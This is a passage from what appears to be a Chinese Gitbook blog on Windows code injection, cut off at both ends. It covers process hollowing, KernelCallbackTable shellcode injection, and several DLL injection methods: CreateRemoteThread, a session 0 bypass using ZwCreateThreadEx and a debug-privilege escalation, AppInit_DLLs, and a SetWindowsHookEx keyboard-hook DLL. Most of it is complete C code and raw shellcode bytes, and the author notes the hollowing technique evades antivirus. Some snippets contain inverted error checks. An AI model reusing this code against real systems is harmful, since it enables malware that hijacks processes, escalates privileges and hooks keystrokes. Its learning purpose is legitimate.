NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb offset DWORD_PTR pef_offset = (DWORD_PTR)pbi.PebBaseAddress; // 修改peb结构体中的baseaddress的值 if (!WriteProcessMemory(pi.hProcess, (LPVOID)((BYTE*)pef_offset+0x10), (LPCVOID)&dwImageBase, sizeof(PVOID), NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } */ // 另一种修改peb的方式 rdx保留了peb的baseaddr, 不要使用(LPCVOID)&dwImageBase，会造成高地址全是cc //WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL); if (!WriteProcessMemory(pi.hProcess, (LPVOID)((ctx.Rdx)+0x10), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL)) { printf(\"WriteProcessMemory error code : %d\\n\", GetLastError()); return 1; } // 替换入口点 64 -> rcx; 32 -> eax //ctx.Rcx = dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint; ctx.Rcx = (SIZE_T)((LPBYTE)pNtHeaders->OptionalHeader.ImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint); if (!SetThreadContext(pi.hThread, &ctx)) { printf(\"SetThreadContext failed : %d\\n\", GetLastError()); return 1; } //CreateRemoteThread(pi.hThread, 0, 0, (LPTHREAD_START_ROUTINE)(dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), 0, 0, NULL); ResumeThread(pi.hThread); free(pBuf); return 0; } 思路简单，就是写起来比较麻烦，但是可以直接注入整个exe文件，比较方便，查杀率高的一逼 6、消息回调注入 通过修改PEB表中的特定消息回调函数的指针使其指向shellcode，然后再向该进程发送消息，触发shellcode执行。SendMessage函数来发送消息进行shellcode的触发。 先用windbg看一下PEB的结构， attach一个进程，然后 !peb # 定位到kct的地址 dps addr L100 # 查看kct的具体内容 老多内容了。 流程 找到目标进程句柄，找到peb地址，定位KernelCallBackTable表（kct表），然后申请内存空间写入shellcode 定位peb 定位kct 申请shellcode空间 创建新的kct 将新的kct的里面的某一个消息回调的地址进行设置为shellcode 更新kct 触发shellcode 实现代码 #include #include #include #include \"struct.h\" // https://github.com/capt-meelo/KernelCallbackTable-Injection/blob/master/KCT.cpp // http://hacky.ren/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/ // 32bit unsigned char shellcode[] = \"\\xcc\\xc3\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; // 64bit unsigned char shellcode64[] = \"\\xcc\\xc3\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\" \"\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\" \"\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\" \"\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\" \"\\x90\\x90\\x90\\xC3\"; /* typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; */ typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; HWND hWnd = FindWindow(L\"Notepad\", NULL); DWORD processId; DWORD threadId = GetWindowThreadProcessId(hWnd, &processId); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId); //printf(\"[++] processId 0x%lp\\n[++] threadId 0x%lp\", processId, threadId); // NtQueryInformationProcess api在ntdll里，属于未公开的函数，所以需要动态调用 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; //ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb & kct address PEB peb; ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL); KERNELCALLBACKTABLE kct; ReadProcessMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL); //DWORD_PTR kct_addr = (DWORD_PTR)(BYTE*)peb_addr + 0x58; // 申请空间写入shellcode LPVOID payloadAddr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode64), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, payloadAddr, shellcode64, sizeof(shellcode64), NULL); // 创建一个新的kct，因为之前的不能写 LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr; WriteProcessMemory(hProcess, newKCTAddr, &kct, sizeof(kct), NULL); // 更新kct WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &newKCTAddr, sizeof(ULONG_PTR), NULL); // 触发shellcode COPYDATASTRUCT cds; WCHAR msg[] = L\"Pwn\"; cds.dwData = 1; cds.cbData = lstrlen(msg) * 2; cds.lpData = msg; SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds); printf(\"[+] Payload executed\\n\"); return 0; } 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-10 21:08:36 "},"MyArticles/CyberSec/dll-inject.html":{"url":"MyArticles/CyberSec/dll-inject.html","title":"Dll注入的3.5种方式","keywords":"","body":"dll注入和进程注入都属于是代码注入的一种，但是直接注入dll相比于注入shellcode来说不用去关心api函数的调用和位置无关代码的定位。 环境：C、Gcc、Windows11 参考： 《逆向工程核心原理》 https://xz.aliyun.com/t/10318#toc-6 lll哥 编写dll dll注入需要先准备一个dll文件。这个可是比进程注入简单多了，简单太多了，再也不用为了写shellcode恶心了。 dll程序结构： DllMain dll程序可以存在DllMain函数，也可以只存在需要导出的函数。 但是在dll注入的时候，当dll被注入到目标进程之后，dllmain函数会被动执行，所以编写dll注入用的dll就一定需要dllmain。相同的，当执行LoadLibrary函数的时候，也会自动执行dllmain函数。 dllmain有一个固定的结构，注册了四个回调函数，用来表示四种不同的状态。 #include BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { switch (fdwReason) { // 将dll文件附加到进程（加载到地址空间时）。 case DLL_PROCESS_ATTACH: break; // 在进程中创建了新线程之后会执行。 case DLL_THREAD_ATTACH: break; // 进程中的线程退出时，执行的函数。 case DLL_THREAD_DETACH: break; // 当dll从进程空间脱离（退出）时执行的进程。 case DLL_PROCESS_DETACH: break; } return TRUE; } Export function 在前面声明一下函数的调用约定，利用dllexport关键字来说明这个函数是导出函数。 __declspec(dllexport) int __cdecl DownLoadFileFromUrl(int i) { if(i==1) { MessageBox(NULL, TEXT(\"start download file\"), TEXT(\"title 2\"), MB_OK); return RUN_SUCESS; } else if(i==2) { MessageBox(NULL, TEXT(\"stop download file\"), TEXT(\"title 2\"), MB_OK); return RUN_SUCESS; } } 可以这么写，也可以另外使用一个.h文件来说明。 测试代码 利用gcc命令进行编译，不要用dev，会出问题 gcc -o MessageboxDll.dll -shared MessageboxDll.c 在载入进程和脱离进程的时候都进行了函数调用， #include #include #include #define RUN_SUCESS 0 __declspec(dllexport) int __cdecl DownLoadFileFromUrl(int i) { if(i==1) { MessageBox(NULL, TEXT(\"start download file\"), TEXT(\"title 2\"), MB_OK); return RUN_SUCESS; } else if(i==2) { MessageBox(NULL, TEXT(\"stop download file\"), TEXT(\"title 2\"), MB_OK); return RUN_SUCESS; } } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { switch (fdwReason) { // 将dll文件附加到进程（加载到地址空间时）。 case DLL_PROCESS_ATTACH: DownLoadFileFromUrl(1); break; // 在进程中创建了新线程之后会执行。 case DLL_THREAD_ATTACH: break; // 进程中的线程退出时，执行的函数。 case DLL_THREAD_DETACH: break; // 当dll从进程空间脱离（退出）时执行的进程。 case DLL_PROCESS_DETACH: DownLoadFileFromUrl(2); break; } return TRUE; } 注入dll 注入进程拥有目标进程内存的访问权限。注入dll主要有以下三种方法： 创建远程线程 使用注册表 消息HOOK APC注入 1、创建远程线程 利用CreateRemoteThreadAPI进行dll注入，这个API也是在进程注入中常用的API。 思路 将要注入的dll的路径写入被注入进程的地址。 通过CreateRemoteThreadapi利用Loadlibraryapi远程执行，载入dll。 结束 实现代码 下列的代码并不能成功注入dll程序，dll程序是可以正常执行的。但是writeprocessmemory这个api是可以正常执行的。 字符串也能写进去，然后参数传递也正常，通过断点发现调用loadlibrary函数也正常 #include #include #include #define notePID 1924 //char* dllpath = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\dll注入\\\\MessageboxDll.dll\"; char* dllpath = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\32_MessageboxDll.dll\"; int main() { size_t dwsize = (strlen(dllpath) + 1); //* sizeof(TCHAR); // 获取目标进程的句柄，采用打开现有进程的形式 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID); // 在目标进程中开辟内存空间，用来存放注入的dll的地址 LPVOID pRemotebuf= VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_READWRITE); printf(\"[+] VirtualAlloc sucess addr = %p\\n\", pRemotebuf); // 向开辟出来的地址写入dll路径 WriteProcessMemory(hProcess, pRemotebuf, (LPCVOID)dllpath, dwsize, NULL); printf(\"[+] WriteProcessMemory sucess write dll path to target memroy \\n\"); /* * 获取loadlibrary的地址。两种方法 * 1、直接在本程序获得（在Windows中共享库的地址是一定的） * 2、利用PEB计算目标程序的kerneldll地址，复杂但是适合远程 */ //HMODULE hMOD = GetModuleHandle(L\"kernel32.dll\"); HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); FARPROC pThreadProc = GetProcAddress(hMOD, \"LoadLibraryW\"); printf(\"[+] GetProcAddress sucess pthreadproc = %p\\n\", pThreadProc); // 执行dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pThreadProc, pRemotebuf, 0, NULL); printf(\"[+] CreateRemoteThread sucess \\n\"); // 等待信号,创建线程并等待线程函数结束，这里WaitForSingleObject的第二个参数要设置为-1才能够一直等待 // 等着远程执行完dll之后才退出。但是实际发现意义不大 //WaitForSingleObject(hProcess, INFINITE); // 关闭句柄 CloseHandle(hProcess); CloseHandle(hThread); return 0; } 解决办法：感谢lll哥的支持。 注意loadlibrary的参数模式和参数的形式，char还是unicode 主要dll的绝对路径，不能用中文，同目录也要用绝对路径 能用的代码 #include #include #include #include /* * 注意loadlibrary的参数模式和参数的形式，char还是unicode * 主要dll的绝对路径，不能用中文，同目录也要用绝对路径 */ #define notePID 30028 //char* dllpath = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\dll注入\\\\MessageboxDll.dll\"; //char* dllpath = \"C:\\\\Users\\\\rootkit\\\\Desktop\\\\32_MessageboxDll.dll\"; //char* dllpath = \"messageboxDll.dll\"; LPCWSTR dllpath = L\"C:\\\\Users\\\\rootkit\\\\Desktop\\\\messageboxDll.dll\"; int main() { size_t dwsize = (_tcslen(dllpath) + 1) * sizeof(TCHAR); //size_t dwsize = (strlen(dllpath) + 1); //* sizeof(TCHAR); // 获取目标进程的句柄，采用打开现有进程的形式 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID); // 在目标进程中开辟内存空间，用来存放注入的dll的地址 LPVOID pRemotebuf= VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_READWRITE); printf(\"[+] VirtualAlloc sucess addr = %p\\n\", pRemotebuf); // 向开辟出来的地址写入dll路径 WriteProcessMemory(hProcess, pRemotebuf, dllpath, dwsize, NULL); printf(\"[+] WriteProcessMemory sucess write dll path to target memroy \\n\"); /* * 获取loadlibrary的地址。两种方法 * 1、直接在本程序获得（在Windows中共享库的地址是一定的） * 2、利用PEB计算目标程序的kerneldll地址，复杂但是适合远程 */ HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); //HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMOD, \"LoadLibraryW\"); printf(\"[+] GetProcAddress sucess pthreadproc = %p\\n\", pThreadProc); // 执行dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemotebuf, 0, NULL); printf(\"[+] CreateRemoteThread sucess \\n\"); // 等待信号,创建线程并等待线程函数结束，这里WaitForSingleObject的第二个参数要设置为-1才能够一直等待 WaitForSingleObject(hProcess, INFINITE); printf(\"%d\\n\", GetLastError()); // 关闭句柄 CloseHandle(hProcess); CloseHandle(hThread); return 0; } 检查方式 通过观察dll的显著特征。 利用调试器观察。 通过pe explore的shift+ctrl+f的功能来搜索dll程序，查看是否被注入。 1.5、突破 session 0 隔离 session 0隔离 历史 在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的。该会话就叫做Session 0。 从Windows Vista开始，只有服务可以托管到Session 0中，用户应用程序和服务之间会被隔离，并被要求运行在用户登录到系统时创建的后续会话中。例如第一个登录的用户创建 Session 1，第二个登录的用户创建Session 2，以此类推。 为了避免应用程序权限混乱造成的风险，微软提供了SESSION 0 隔离机制。 类似于奥特曼里的宇宙，session 0就是有M78星云的宇宙，赛罗飞出来看到的其他宇宙就是session1- n这些。 这里要实现的就是从其他session中，将dll注入到session 0中。 原理方法 由于SESSION 0隔离机制在内核6.0之后（vista、7、8...）,当创建一个线程后，并不会立即运行，通过先挂起进程，查看要运行的进程所在会话层之后再决定是否恢复进程运行，直接使用CreateRemoteThread无法实现【CreateSuspended的默认参数值为1导致线程无法恢复运行，导致DLL注入失败。】 突破 直接调用ZwCreateThreadEx，并在程序运行指定CreateSuspended为0即可实现远程线程注入DLL突破SESSION 0隔离。 关键API ZwCreateThreadEx 这个api没有公布，所以介绍不多。在 ntdll.dll 中并没有声明，所以我们需要使用 GetProcAddress从 ntdll.dll中获取该函数的导出地址。 // 64bit的情况下 DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown); // 32bit的情况下 DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown); 突破到session 0，还需要提高权限到system权限。 OpenProcessToken 打开与进程关联的访问令牌。 BOOL OpenProcessToken( __in HANDLE ProcessHandle, //要修改访问权限的进程句柄 __in DWORD DesiredAccess, //指定你要进行的操作类型 __out PHANDLE TokenHandle //返回的访问令牌指针 ); 如果该函数成功，则返回值为非零值。 LookupPrivilegeValueA 检索指定系统上用于本地表示指定特权名称的 LUID (LUID) 本地唯一标识符。 BOOL LookupPrivilegeValueA( LPCSTR lpSystemName, //要查看的系统，本地系统直接用NULL LPCSTR lpName, //指向一个以零结尾的字符串，指定特权的名称 PLUID lpLuid //用来接收所返回的制定特权名称的信息 ); 如果函数成功，该函数将返回非零。 AdjustTokenPrivileges 启用或禁用指定访问令牌中的特权。 在访问令牌中启用或禁用特权需要TOKEN_ADJUST_PRIVILEGES访问权限。 BOOL AdjustTokenPrivileges( HANDLE TokenHandle, //包含特权的句柄 BOOL DisableAllPrivileges, //禁用所有权限标志 PTOKEN_PRIVILEGES NewState, //新特权信息的指针(结构体) DWORD BufferLength, //缓冲数据大小,以字节为单位的PreviousState的缓存区(sizeof) PTOKEN_PRIVILEGES PreviousState,//接收被改变特权当前状态的Buffer PDWORD ReturnLength //接收PreviousState缓存区要求的大小 ); 实现流程 对自己进程进行提权，提权是为了执行特权指令 OpenProcess 打开要注入的进程获取进程句柄 VirtualAllocEx 在被注入的进程中申请读写内存 WriteProcessMemory 写入DLL路径到申请的内存中 获取ZtCreateThreadEx地址 提权 因为目标进程要执行高权限的一些存放在dll中的一些函数功能，所以需要先对目标进程进行提权操作。 1、OpenProcessToken 2、LookupPrivilegeValue 3、AdjustTokenPrivileges 所谓提权的本质还是利用AdjustTokenPrivilegesapi将禁用的权限重新启用。 #include #include #include BOOL EnableDebugPrivilege() { HANDLE hToken; BOOL fOk = FALSE; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) { TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid); tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); CloseHandle(hToken); } return fOk; } 然后利用提到的API进行系统服务级别的dll的注入 #include #include #include #ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown); #else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown); #endif #define notePID 23472 LPCWSTR pszDllFileName = L\"C:\\\\Users\\\\rootkit\\\\Desktop\\\\messageboxDll.dll\"; BOOL EnableDebugPrivilege() { HANDLE hToken; BOOL fOk = FALSE; // 利用 TOKEN_ADJUST_PRIVILEGES ，这时启用或禁用特权所必需的，函数返回时标识新打开的访问令牌的句柄的指针hToken if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) { // 包含有关访问令牌的一组特权的信息的结构体 TOKEN_PRIVILEGES tp; // Privileges 数组中的条目数 tp.PrivilegeCount = 1; // 在本地系统上查找特权名称 LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid); // tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // 启用或禁用指定访问令牌中的特权 fOk = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL); CloseHandle(hToken); } return fOk; } int main() { HANDLE hProcess = NULL; SIZE_T dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; HANDLE hRemoteThread = NULL; DWORD dwStatus = 0; if (!EnableDebugPrivilege()) { printf(\"modify the promession failed\\n\"); return 0; } // 打开注入进程，获取进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID); if (hProcess == NULL) { printf(\"OpenProcess Error! %d\\n\", GetLastError()); return 3; } // 在注入的进程申请内存地址 dwSize = lstrlen(pszDllFileName) + 1; pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); if (NULL == pDllAddr) { printf(\"VirualAlloc failed %d\\n\", GetLastError()); return 3; } //写入内存地址 if (WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) { printf(\"WriteProcessMemory failed %d\", GetLastError()); return 3; } //加载ntdll HMODULE hNtdllDll = LoadLibraryA(\"ntdll.dll\"); if (NULL == hNtdllDll) { printf(\"loadlibrary failed %d\\n\", GetLastError()); return 3; } // 获取LoadLibraryA函数地址 pFuncProcAddr = GetProcAddress(GetModuleHandleA(\"Kernelbase.dll\"), \"LoadLibraryW\"); if (pFuncProcAddr) { printf(\"find loadlibrary addr failed %d\\n\", GetLastError()); return 3; } //获取ZwCreateThreadEx函数地址 typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, \"ZwCreateThreadEx\"); if (ZwCreateThreadEx) { printf(\"get ZwCreateThread failed %d\\n\", GetLastError()); return 3; } // 使用 ZwCreateThreadEx 创建远线程, 实现 DLL 注入 dwStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL); if (ZwCreateThreadEx) { printf(\"call ZwCreateThread failed %d\\n\", GetLastError()); return 3; } // 关闭句柄 CloseHandle(hProcess); FreeLibrary(hNtdllDll); printf(\"Inject Dll OK!\\n\\n\"); return 0; } 2、修改注册表 利用 AppInit_DLLs 技术通过修改加载顺序来达到注入的目的，这个修改是全局的，可能会导致系统无法正常启动，可以作为一个恶意病毒传播。 原理 User32.dll被加载到进程的时候，会读取存放在AppInit_DLLs，如果里面有值的话，就调用loadlibrary加载用户dll，所以这里存放的dll并不会加载到所有进程，只会加载到User32.dll的进程中去。 3、SetWindowsHookEx 原理 该方法的核心原理是依赖于这个api进行的，其他的没有什么技术。 常见Windows系统是基于消息机制的，通过每一个GUI线程都会维护一个线程消息队列。通过识别消息队列中的不同的消息来达到实现不同功能的目的。 根据上述原理，windows通过钩子机制来截获和监视系统中的这些消息，同样的我们也可以利用hook去实现自己的目的。 Hook分为全局和局部，全局一般用来实现dll注入(因为每一个进程的地址都是独立的，如果不将hook函数作为一个独立的地址，那么执行起来将非常麻烦)，局部hook就是针对某一个线程进行hook。 HHOOK WINAPI SetWindowsHookEx( __in int idHook, \\\\钩子类型 __in HOOKPROC lpfn, \\\\回调函数地址 __in HINSTANCE hMod, \\\\实例句柄 __in DWORD dwThreadId); \\\\线程ID，设置为0则为全局钩子，会影响所有的进程 使用这个api之后，当任意进程中生成指定的消息的时候，os就会把这个dll载进去，然后调用hook，这都是os自动进行的。 钩子类型：idHooK 值 含义 WH_CALLWNDPROC 4 安装一个挂钩过程，用于监视系统将消息发送到目标窗口过程之前的消息。 有关详细信息，请参阅 CallWndProc) 挂钩过程。 WH_CALLWNDPROCRET 12 安装一个挂钩过程，用于在目标窗口过程处理消息后监视消息。 有关详细信息，请参阅 CallWndRetProc 挂钩过程。 WH_CBT 5 安装一个挂钩过程，用于接收对 CBT 应用程序有用的通知。 有关详细信息，请参阅 CBTProc) 挂钩过程。 WH_DEBUG 9 安装一个挂钩过程，用于调试其他挂钩过程。 有关详细信息，请参阅 DebugProc) 挂钩过程。 WH_FOREGROUNDIDLE 11 安装将在应用程序前台线程即将处于空闲状态时调用的挂钩过程。 此挂钩可用于在空闲时间执行低优先级任务。 有关详细信息，请参阅 ForegroundIdleProc) 挂钩过程。 WH_GETMESSAGE 3 安装一个挂钩过程，用于监视发布到消息队列的消息。 有关详细信息，请参阅 GetMsgProc) 挂钩过程。 WH_JOURNALPLAYBACK 1 警告从Windows 11开始，不支持日记挂钩 API，将在将来的版本中删除。 因此，我们强烈建议改为调用 SendInput TextInput API。安装一个挂钩过程，用于发布以前由 WH_JOURNALRECORD 挂钩过程记录的消息。 有关详细信息，请参阅 JournalPlaybackProc) 挂钩过程。 WH_JOURNALRECORD 0 警告从Windows 11开始，不支持日记挂钩 API，将在将来的版本中删除。 因此，我们强烈建议改为调用 SendInput TextInput API。安装一个挂钩过程，用于记录发布到系统消息队列的输入消息。 此挂钩可用于录制宏。 有关详细信息，请参阅 JournalRecordProc) 挂钩过程。 WH_KEYBOARD 2 安装监视击键消息的挂钩过程。 有关详细信息，请参阅 KeyboardProc) 挂钩过程。 WH_KEYBOARD_LL 13 安装用于监视低级别键盘输入事件的挂钩过程。 有关详细信息，请参阅 LowLevelKeyboardProc) 挂钩过程。 WH_MOUSE 7 安装监视鼠标消息的挂钩过程。 有关详细信息，请参阅 MouseProc) 挂钩过程。 WH_MOUSE_LL 14 安装用于监视低级别鼠标输入事件的挂钩过程。 有关详细信息，请参阅 LowLevelMouseProc) 挂钩过程。 WH_MSGFILTER -1 安装一个挂钩过程，用于监视在对话框、消息框、菜单或滚动条中由输入事件生成的消息。 有关详细信息，请参阅 MessageProc) 挂钩过程。 WH_SHELL 10 安装一个挂钩过程，用于接收对 shell 应用程序有用的通知。 有关详细信息，请参阅 ShellProc) 挂钩过程。 WH_SYSMSGFILTER 6 安装一个挂钩过程，用于监视在对话框、消息框、菜单或滚动条中由输入事件生成的消息。 挂钩过程监视与调用线程位于同一桌面中的所有应用程序的消息。 有关详细信息，请参阅 SysMsgProc) 挂钩过程。 HOOKPORC 指向挂钩过程的指针。 如果 dwThreadId 参数为零或指定由其他进程创建的线程的标识符， 则 lpfn 参数必须指向 DLL 中的挂钩过程。 否则， lpfn 可以指向与当前进程关联的代码中的挂钩过程。 HINSTANCE 包含 lpfn 参数指向的挂钩过程的 DLL 的句柄。 如果 dwThreadId 参数指定由当前进程创建的线程，并且挂钩过程位于与当前进程关联的代码中，则必须将 hMod 参数设置为 NULL。 返回值 类型： HHOOK 如果函数成功，则返回值是挂钩过程的句柄；如果函数失败，则返回值为 NULL。 要获得更多的错误信息，请调用 GetLastError。 KeyboardProc函数 这是 键盘钩子的处理函数，这个函数是可以进行重命名的，但是参数不能变，使用这个函数的前提是SetWindowsHookEx函数的第一个参数必须是WH_KEYBOARD，才能使用。相当于一个配套设施了。 LRESULT CALLBACK KeyboardProc( _In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam ); 实现过程 简单起见，直接使用《逆向工程核心原理》的敲击记录的代码来做实验。 keylogger.dll，用来准备注入 dll 程序。 #include #include HINSTANCE g_hInstance = NULL; HHOOK g_hHook = NULL; HWND g_hWnd = NULL; #define DEF_PROCESS_NAME \"notepad.exe\" // 这个回调函数用来处理键盘输入 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { char szPath[MAX_PATH] = {0}; char* p = NULL; if(nCode >= 0) { if(!(lParam & 0x80000000)) { GetModuleFileNameA(NULL, szPath, MAX_PATH); // 取\\\\之后的字符，用来判断是不是目标进程notepad。 p = strrchr(szPath, '\\\\'); } } if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; // 不是就换下一个函数 return CallNextHookEx(g_hHook, nCode, wParam, lParam); } // 利用api启动挂钩 __declspec(dllexport) void StartHook() { g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } // 取消挂钩 __declspec(dllexport) void StopHook() { // 先检查一下第一步挂钩是否成功，是被就不用了 if(g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; } } // 这里的dllmain实际上用不到, 写不写都无所谓了 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; } return TRUE; } 向开始的话直接调用这个dll就可以，然后设置一个退出的条件。 4、APC注入 APC，全称为Asynchronous Procedure Call，异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。 异步执行 同步 发出一个功能调用时，在没有得到结果之前，该调用就不返回或继续执行后续操作。 简单来说，同步就是必须一件一件事做，等前一件做完了才能做下一件事。 例如：B/S模式中的表单提交，具体过程是：客户端提交请求->等待服务器处理->处理完毕返回，在这个过程中客户端（浏览器）不能做其他事。 类似于顺序执行。 异步 